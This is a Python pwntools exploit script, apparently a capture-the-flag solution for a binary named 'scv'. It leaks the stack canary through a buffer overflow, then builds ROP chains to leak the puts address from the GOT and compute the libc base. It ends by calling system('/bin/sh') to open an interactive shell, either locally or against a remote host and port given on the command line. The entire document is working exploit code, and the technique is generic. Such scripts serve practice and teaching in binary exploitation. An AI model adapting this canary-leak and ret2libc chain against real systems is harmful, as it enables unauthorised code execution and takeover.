#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False


def exploit(r):

    r.recvuntil(">>")
    r.sendline("1")
    
    r.recvuntil(">>")
    buf = ""
    buf += "A"*0xa8
    
    r.sendline(buf)

    r.recvuntil(">>")
    r.sendline("2")
    r.recvuntil("A"*0xa8)
    r.recvn(1) #newline
    canary = u64("\x00" + r.recvn(7))
    print("canary: ", hex(canary))

    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil(">>")

    puts_offset = 0x6F690
    puts_got = 0x602018
    puts_call = 0x4008D0
    pop_rdi = 0x0000000000400ea3

    payload = ""
    payload += "A"*0xa8
    payload += p64(canary)
    payload += "B"*8
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_call)
    payload += p64(0x400a96)
    r.sendline(payload)





    r.recvuntil(">>")
    r.sendline("3")
    r.recvuntil("MIENRALS...\n")
    puts_leak = u64(r.recvn(6)+"\x00\x00")
    base_libc = puts_leak - puts_offset
    system_offset = 0x45390
    system_addr = base_libc + system_offset
    binsh_offset = 0x18CD17
    binsh = base_libc + binsh_offset
    print("puts addr: ", hex(puts_leak))
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil(">>")
    payload1 = ""
    payload1 += "A"*0xa8
    payload1 += p64(canary)
    payload1 += "B"*8
    payload1 += p64(pop_rdi)
    payload1 += p64(binsh)
    payload1 += p64(system_addr)
    r.sendline(payload1)
    r.recvuntil(">>")
    r.sendline("3")

    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./scv"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x400cce",
            "b *0x400dc5",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

